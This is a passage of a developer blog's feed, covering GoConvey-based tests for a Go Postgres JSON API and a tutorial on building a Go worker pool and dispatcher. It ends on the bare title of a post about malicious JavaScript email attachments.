</span><span class='line'>  <span class="nx">TestConfig</span> <span class="kd">struct</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">Config</span> <span class="s">`json:&quot;database&quot;`</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">Conf</span> <span class="nx">TestConfig</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">Data</span> <span class="o">*</span><span class="nx">Store</span>
</span><span class='line'>
</span><span class='line'><span class="kd">func</span> <span class="nx">TestDatabase</span><span class="p">(</span><span class="nx">t</span> <span class="o">*</span><span class="nx">testing</span><span class="p">.</span><span class="nx">T</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">Convey</span><span class="p">(</span><span class="s">&quot;The Database Should&quot;</span><span class="p">,</span> <span class="nx">t</span><span class="p">,</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">Convey</span><span class="p">(</span><span class="s">&quot;Be Configurable From A JSON File&quot;</span><span class="p">,</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>          <span class="nx">data</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nx">ReadFile</span><span class="p">(</span><span class="s">&quot;../configs/example.config.json&quot;</span><span class="p">)</span>
</span><span class='line'>          <span class="nx">So</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">ShouldBeNil</span><span class="p">)</span>
</span><span class='line'>          <span class="nx">So</span><span class="p">(</span><span class="nx">json</span><span class="p">.</span><span class="nx">Unmarshal</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">Conf</span><span class="p">),</span> <span class="nx">ShouldBeNil</span><span class="p">)</span>
</span><span class='line'>          <span class="nx">So</span><span class="p">(</span><span class="nx">Conf</span><span class="p">,</span> <span class="nx">ShouldNotBeEmpty</span><span class="p">)</span>
</span><span class='line'>          <span class="nx">Data</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">Conf</span><span class="p">.</span><span class="nx">NewStore</span><span class="p">()</span>
</span><span class='line'>          <span class="nx">So</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">ShouldBeNil</span><span class="p">)</span>
</span><span class='line'>          <span class="nx">So</span><span class="p">(</span><span class="nx">Data</span><span class="p">,</span> <span class="nx">ShouldNotBeNil</span><span class="p">)</span>
</span><span class='line'>      <span class="p">})</span>
</span><span class='line'>      <span class="nx">Convey</span><span class="p">(</span><span class="s">&quot;Have Migrations For The Schema&quot;</span><span class="p">,</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>          <span class="nx">So</span><span class="p">(</span><span class="nx">Data</span><span class="p">.</span><span class="nx">Migrate</span><span class="p">(</span><span class="kc">false</span><span class="p">),</span> <span class="nx">ShouldBeNil</span><span class="p">)</span>
</span><span class='line'>      <span class="p">})</span>
</span><span class='line'>  <span class="p">})</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">modelTests</span> <span class="p">=</span> <span class="p">[]</span><span class="nx">ModelTest</span><span class="p">{</span><span class="nx">UserTest</span><span class="p">}</span>
</span><span class='line'>  <span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">model</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">modelTests</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">Convey</span><span class="p">(</span><span class="s">&quot;The Database &quot;</span><span class="o">+</span><span class="nx">model</span><span class="p">.</span><span class="nx">Title</span><span class="p">,</span> <span class="nx">t</span><span class="p">,</span> <span class="nx">model</span><span class="p">.</span><span class="nx">Func</span><span class="p">(</span><span class="nx">Data</span><span class="p">))</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>As you can see the <code>ModelTest</code> structure is in essence the parameters necessary to run <code>Convey()</code>. Since <code>*testing.T</code> was passed in the outermost <code>Convey()</code> it is not necessary for these nested tests. There for we can pass it a <code>string</code> conveying what it will test and some arbitrary test <code>func()</code>. Below is the test of the <code>POST</code> portion of the RESTful interface for the user model. The other conveyed tests in <code>user_test.go</code> check <code>GET</code>, <code>PUT</code>, &amp; <code>DELETE</code> implementation.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">var</span> <span class="nx">UserTest</span> <span class="p">=</span> <span class="nx">ModelTest</span><span class="p">{</span>
</span><span class='line'>  <span class="nx">Title</span><span class="p">:</span> <span class="s">&quot;User Model Should&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="nx">Func</span><span class="p">:</span> <span class="kd">func</span><span class="p">(</span><span class="nx">store</span> <span class="o">*</span><span class="nx">Store</span><span class="p">)</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">return</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>          <span class="nx">Convey</span><span class="p">(</span><span class="s">&quot;Implement The CRUD Interface&quot;</span><span class="p">,</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>              <span class="nx">So</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">User</span><span class="p">{},</span> <span class="nx">ShouldImplement</span><span class="p">,</span> <span class="p">(</span><span class="o">*</span><span class="nx">CRUD</span><span class="p">)(</span><span class="kc">nil</span><span class="p">))</span>
</span><span class='line'>              <span class="nx">Convey</span><span class="p">(</span><span class="s">&quot;A User Can Be Created&quot;</span><span class="p">,</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>                  <span class="nx">So</span><span class="p">(</span><span class="nx">store</span><span class="p">.</span><span class="nx">EWT</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">Create</span><span class="p">()),</span> <span class="nx">ShouldBeNil</span><span class="p">)</span>
</span><span class='line'>                  <span class="nx">read</span> <span class="o">:=</span> <span class="nb">new</span><span class="p">(</span><span class="nx">User</span><span class="p">)</span>
</span><span class='line'>                  <span class="nx">pm</span> <span class="o">:=</span> <span class="nb">new</span><span class="p">(</span><span class="nx">PropertyMap</span><span class="p">)</span>
</span><span class='line'>                  <span class="nx">So</span><span class="p">(</span><span class="nx">store</span><span class="p">.</span><span class="nx">QWT</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">Read</span><span class="p">(),</span> <span class="nx">pm</span><span class="p">),</span> <span class="nx">ShouldBeNil</span><span class="p">)</span>
</span><span class='line'>                  <span class="nx">data</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">json</span><span class="p">.</span><span class="nx">Marshal</span><span class="p">(</span><span class="nx">pm</span><span class="p">)</span>
</span><span class='line'>                  <span class="nx">So</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">ShouldBeNil</span><span class="p">)</span>
</span><span class='line'>                  <span class="nx">So</span><span class="p">(</span><span class="nx">json</span><span class="p">.</span><span class="nx">Unmarshal</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">read</span><span class="p">),</span> <span class="nx">ShouldBeNil</span><span class="p">)</span>
</span><span class='line'>                  <span class="nx">So</span><span class="p">(</span><span class="nx">read</span><span class="p">,</span> <span class="nx">ShouldResemble</span><span class="p">,</span> <span class="nx">user</span><span class="p">)</span>
</span><span class='line'>              <span class="p">})</span>
</span><span class='line'>      <span class="c1">// Other Model tests go here ...</span>
</span><span class='line'>      <span class="p">})</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>  <span class="p">},</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Running Tests</h3>

<p>After writing all of our test cases for the model, we can implement the model using red to green testing. I will go into implementing a model at a later date but below is the output you would get after running <code>go test -v</code> with completed code.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">===</span> RUN   TestDatabase
</span><span class='line'>
</span><span class='line'>  The Database Should
</span><span class='line'>    Be Configurable From A JSON File ✔✔✔✔✔
</span><span class='line'>    Have Migrations For The Schema ✔
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="m">6</span> total assertions
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  The Database User Model Should
</span><span class='line'>    Implement The CRUD Interface ✔
</span><span class='line'>      A User Can Be Created ✔✔✔✔✔✔
</span><span class='line'>      A User Can Be Read ✔✔✔✔✔
</span><span class='line'>      A User Can Be Updated ✔✔✔✔✔✔
</span><span class='line'>      A User Can Be Deleted ✔✔
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="m">26</span> total assertions
</span><span class='line'>
</span><span class='line'>--- PASS: TestDatabase <span class="o">(</span>0.08s<span class="o">)</span>
</span><span class='line'>PASS
</span><span class='line'>ok      github.com/elauqsap/echo-postgres-json-api/database     0.083
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Building a Go Work Pool and Dispatcher]]></title>
    <link href="http://elauqsap.github.io/blog/2016/05/25/building-a-go-work-pool-and-dispatcher/"/>
    <updated>2016-05-25T22:41:16-05:00</updated>
    <id>http://elauqsap.github.io/blog/2016/05/25/building-a-go-work-pool-and-dispatcher</id>
    <content type="html"><![CDATA[<p>I recently started working with <a href="https://golang.org/">Go</a> which is a very opinionated open source programming language from Google and contributors. It is a fantastic language and I rather enjoy how it has helped me develop as a programmer these past few months.</p>

<!--more-->


<h3>Back Story</h3>

<p>My new position at work requires me to work with a large data set that I decided to truncate into smaller sets for processing. I wanted to process each batch in parallel but without restricting myself to a single &ldquo;job type&rdquo;. So that in the future when the code requires a different &ldquo;job type&rdquo; I would not have to wrangle multiple work pools. In developing the solution, I found a work around to Go&rsquo;s lack of generics so I could process multiple &ldquo;job types&rdquo; via the same work pool. This code is modified from a blog post written <a href="http://marcio.io/2015/07/handling-1-million-requests-per-minute-with-golang/">here</a>. I also packaged this code for my reuse <a href="https://github.com/elauqsap/workerpool">here</a>.</p>

<h3>Dispatcher</h3>

<p>The role of the <code>Dispatcher</code> is to initialize the <code>WorkerPool</code>, dispatch jobs as they are created, and wait for the go routines to finish before closing out the main thread.</p>

<figure class='code'><figcaption><span>dispatcher.go</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kn">package</span> <span class="nx">main</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="s">&quot;sync&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Dispatcher creates workers and dispatches jobs when received</span>
</span><span class='line'><span class="kd">type</span> <span class="nx">Dispatcher</span> <span class="kd">struct</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">JobQueue</span>   <span class="kd">chan</span> <span class="nx">Job</span>
</span><span class='line'>  <span class="nx">MaxWorkers</span> <span class="kt">int</span>
</span><span class='line'>  <span class="nx">WaitGroup</span>  <span class="o">*</span><span class="nx">sync</span><span class="p">.</span><span class="nx">WaitGroup</span>
</span><span class='line'>  <span class="c1">// A pool of workers channels that are registered with the dispatcher</span>
</span><span class='line'>  <span class="nx">WorkerPool</span> <span class="kd">chan</span> <span class="kd">chan</span> <span class="nx">Job</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// NewDispatcher creates a dispatcher that is used to create workers</span>
</span><span class='line'><span class="c1">// and dispatch jobs to them</span>
</span><span class='line'><span class="kd">func</span> <span class="nx">NewDispatcher</span><span class="p">(</span><span class="nx">maxWorkers</span> <span class="kt">int</span><span class="p">)</span> <span class="o">*</span><span class="nx">Dispatcher</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">pool</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kd">chan</span> <span class="nx">Job</span><span class="p">,</span> <span class="nx">maxWorkers</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="o">&amp;</span><span class="nx">Dispatcher</span><span class="p">{</span><span class="nx">JobQueue</span><span class="p">:</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="nx">Job</span><span class="p">,</span> <span class="mi">1024</span><span class="p">),</span> <span class="nx">MaxWorkers</span><span class="p">:</span> <span class="nx">maxWorkers</span><span class="p">,</span> <span class="nx">WorkerPool</span><span class="p">:</span> <span class="nx">pool</span><span class="p">,</span> <span class="nx">WaitGroup</span><span class="p">:</span> <span class="o">&amp;</span><span class="nx">sync</span><span class="p">.</span><span class="nx">WaitGroup</span><span class="p">{}}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Run creates the workers and dispatches jobs from a JobQueue to each worker</span>
</span><span class='line'><span class="kd">func</span> <span class="p">(</span><span class="nx">d</span> <span class="o">*</span><span class="nx">Dispatcher</span><span class="p">)</span> <span class="nx">Run</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="c1">// starting n number of workers</span>
</span><span class='line'>  <span class="k">for</span> <span class="nx">i</span> <span class="o">:=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="p">&lt;</span> <span class="nx">d</span><span class="p">.</span><span class="nx">MaxWorkers</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">worker</span> <span class="o">:=</span> <span class="nx">NewWorker</span><span class="p">(</span><span class="nx">d</span><span class="p">.</span><span class="nx">WorkerPool</span><span class="p">,</span> <span class="nx">d</span><span class="p">.</span><span class="nx">WaitGroup</span><span class="p">)</span>
</span><span class='line'>      <span class="nx">worker</span><span class="p">.</span><span class="nx">Start</span><span class="p">()</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// start the dispatcher routine</span>
</span><span class='line'>  <span class="k">go</span> <span class="nx">d</span><span class="p">.</span><span class="nx">dispatch</span><span class="p">()</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">func</span> <span class="p">(</span><span class="nx">d</span> <span class="o">*</span><span class="nx">Dispatcher</span><span class="p">)</span> <span class="nx">dispatch</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">select</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">case</span> <span class="nx">job</span> <span class="o">:=</span> <span class="o">&lt;-</span><span class="nx">d</span><span class="p">.</span><span class="nx">JobQueue</span><span class="p">:</span>
</span><span class='line'>          <span class="c1">// a job request has been received</span>
</span><span class='line'>          <span class="k">go</span> <span class="kd">func</span><span class="p">(</span><span class="nx">job</span> <span class="nx">Job</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>              <span class="c1">// try to obtain a worker job channel that is available.</span>
</span><span class='line'>              <span class="c1">// this will block until a worker is idle</span>
</span><span class='line'>              <span class="nx">jobChannel</span> <span class="o">:=</span> <span class="o">&lt;-</span><span class="nx">d</span><span class="p">.</span><span class="nx">WorkerPool</span>
</span><span class='line'>              <span class="c1">// dispatch the job to the worker job channel</span>
</span><span class='line'>              <span class="nx">jobChannel</span> <span class="o">&lt;-</span> <span class="nx">job</span>
</span><span class='line'>          <span class="p">}(</span><span class="nx">job</span><span class="p">)</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Worker</h3>

<p>A <code>Worker</code> is started by the <code>Dispatcher</code>and registers itself to the <code>WorkerPool</code>. Once a <code>Job</code> has been sent to the <code>Dispatcher</code>, it waits for a <code>Worker</code> to become ready for processing and hands off the <code>Job</code> to the <code>Worker</code>. The <code>Worker</code> triggers the <code>process()</code> method of the <code>Job</code>.</p>

<figure class='code'><figcaption><span>worker.go</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kn">package</span> <span class="nx">main</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="p">(</span>
</span><span class='line'>  <span class="s">&quot;fmt&quot;</span>
</span><span class='line'>  <span class="s">&quot;sync&quot;</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Worker represents the worker that executes the job</span>
</span><span class='line'><span class="kd">type</span> <span class="nx">Worker</span> <span class="kd">struct</span> <span class="p">{</span>
</span><span class='line'>  <span class="c1">// A pool of workers channels that are registered with the dispatcher</span>
</span><span class='line'>  <span class="nx">WorkerPool</span> <span class="kd">chan</span> <span class="kd">chan</span> <span class="nx">Job</span>
</span><span class='line'>  <span class="c1">// A channel for receiving a job that was dispatched</span>
</span><span class='line'>  <span class="nx">JobChannel</span> <span class="kd">chan</span> <span class="nx">Job</span>
</span><span class='line'>  <span class="c1">// A channel for receiving a worker termination signal</span>
</span><span class='line'>  <span class="c1">// (quits after processing)</span>
</span><span class='line'>  <span class="nx">quit</span>       <span class="kd">chan</span> <span class="kt">bool</span>
</span><span class='line'>  <span class="c1">// A WaitGroup to signal the completed processing of a Job</span>
</span><span class='line'>  <span class="nx">wg</span>         <span class="o">*</span><span class="nx">sync</span><span class="p">.</span><span class="nx">WaitGroup</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// NewWorker creates a new worker that can be registered to a WorkerPool</span>
</span><span class='line'><span class="c1">// and receive jobs</span>
</span><span class='line'><span class="kd">func</span> <span class="nx">NewWorker</span><span class="p">(</span><span class="nx">workerPool</span> <span class="kd">chan</span> <span class="kd">chan</span> <span class="nx">Job</span><span class="p">,</span> <span class="nx">wg</span> <span class="o">*</span><span class="nx">sync</span><span class="p">.</span><span class="nx">WaitGroup</span><span class="p">)</span> <span class="nx">Worker</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">return</span> <span class="nx">Worker</span><span class="p">{</span>
</span><span class='line'>      <span class="nx">WorkerPool</span><span class="p">:</span> <span class="nx">workerPool</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">JobChannel</span><span class="p">:</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="nx">Job</span><span class="p">),</span>
</span><span class='line'>      <span class="nx">quit</span><span class="p">:</span>       <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kt">bool</span><span class="p">),</span>
</span><span class='line'>      <span class="nx">wg</span><span class="p">:</span>         <span class="nx">wg</span><span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Start method starts the run loop for the worker, listening for a quit channel in</span>
</span><span class='line'><span class="c1">// case we need to stop it</span>
</span><span class='line'><span class="kd">func</span> <span class="p">(</span><span class="nx">w</span> <span class="nx">Worker</span><span class="p">)</span> <span class="nx">Start</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">go</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">for</span> <span class="p">{</span>
</span><span class='line'>          <span class="c1">// register the current worker into the worker queue.</span>
</span><span class='line'>          <span class="nx">w</span><span class="p">.</span><span class="nx">WorkerPool</span> <span class="o">&lt;-</span> <span class="nx">w</span><span class="p">.</span><span class="nx">JobChannel</span>
</span><span class='line'>
</span><span class='line'>          <span class="k">select</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">case</span> <span class="nx">job</span> <span class="o">:=</span> <span class="o">&lt;-</span><span class="nx">w</span><span class="p">.</span><span class="nx">JobChannel</span><span class="p">:</span>
</span><span class='line'>              <span class="nx">job</span><span class="p">.</span><span class="nx">process</span><span class="p">()</span>
</span><span class='line'>              <span class="c1">// signal to the wait group that a queued job has been processed</span>
</span><span class='line'>              <span class="c1">// so the main thread can continue</span>
</span><span class='line'>              <span class="nx">w</span><span class="p">.</span><span class="nx">wg</span><span class="p">.</span><span class="nx">Done</span><span class="p">()</span>
</span><span class='line'>          <span class="k">case</span> <span class="o">&lt;-</span><span class="nx">w</span><span class="p">.</span><span class="nx">quit</span><span class="p">:</span>
</span><span class='line'>              <span class="c1">// we have received a signal to stop</span>
</span><span class='line'>              <span class="k">return</span>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}()</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Job</h3>

<p>All <code>Job</code> types implement a <code>process()</code> method. This way we do not need to infer types in the <code>Worker</code> thus allowing us to achieve a level of generic types in Go.</p>

<figure class='code'><figcaption><span>jobs.go</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kn">package</span> <span class="nx">main</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Job interface will be implemented for each task so that they</span>
</span><span class='line'><span class="c1">// may be passed to workers in the pool by the dispatcher</span>
</span><span class='line'><span class="kd">type</span> <span class="nx">Job</span> <span class="kd">interface</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">process</span><span class="p">()</span> <span class="kt">error</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">type</span> <span class="nx">BatchJob</span> <span class="kd">struct</span> <span class="p">{</span>
</span><span class='line'>  <span class="c1">// define the struct</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">func</span> <span class="p">(</span><span class="nx">b</span> <span class="nx">BatchJob</span><span class="p">)</span> <span class="nx">process</span><span class="p">()</span> <span class="kt">error</span> <span class="p">{</span>
</span><span class='line'>  <span class="c1">// process data here for batch sets ...</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">type</span> <span class="nx">SingleJob</span> <span class="kd">struct</span> <span class="p">{</span>
</span><span class='line'>  <span class="c1">// define the struct</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">func</span> <span class="p">(</span><span class="nx">s</span> <span class="nx">SingleJob</span><span class="p">)</span> <span class="nx">process</span><span class="p">()</span> <span class="kt">error</span> <span class="p">{</span>
</span><span class='line'>  <span class="c1">// process data here for a single set ...</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h3>All Together Now</h3>

<p>Here is an example of the above code in action. The <code>struct</code> need to be defined and <code>process()</code> implemented but it demonstrates the overall concept.</p>

<figure class='code'><figcaption><span>main.go</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kn">package</span> <span class="nx">main</span>
</span><span class='line'>
</span><span class='line'><span class="kd">func</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="c1">// Initialize a Dispatcher</span>
</span><span class='line'>  <span class="nx">dispatcher</span> <span class="o">:=</span> <span class="nx">NewDispatcher</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span><span class='line'>  <span class="c1">// Start the Dispatcher and create/register the Workers to the WorkerPool</span>
</span><span class='line'>  <span class="nx">dispatcher</span><span class="p">.</span><span class="nx">Run</span><span class="p">()</span>
</span><span class='line'>  <span class="c1">// Queue two jobs for processing</span>
</span><span class='line'>  <span class="nx">dispatcher</span><span class="p">.</span><span class="nx">WaitGroup</span><span class="p">.</span><span class="nx">Add</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span><span class='line'>  <span class="c1">// Two jobs of different structures queued</span>
</span><span class='line'>  <span class="nx">dispatcher</span><span class="p">.</span><span class="nx">JobQueue</span> <span class="o">&lt;-</span> <span class="nx">BatchJob</span><span class="p">{}</span>
</span><span class='line'>  <span class="nx">dispatcher</span><span class="p">.</span><span class="nx">JobQueue</span> <span class="o">&lt;-</span> <span class="nx">SingleJob</span><span class="p">{}</span>
</span><span class='line'>  <span class="c1">// Block main thread until processing in go routines completes</span>
</span><span class='line'>  <span class="nx">dispatcher</span><span class="p">.</span><span class="nx">WaitGroup</span><span class="p">.</span><span class="nx">Wait</span><span class="p">()</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[More Emails With Malicious JavaScript Attachments]]></title>
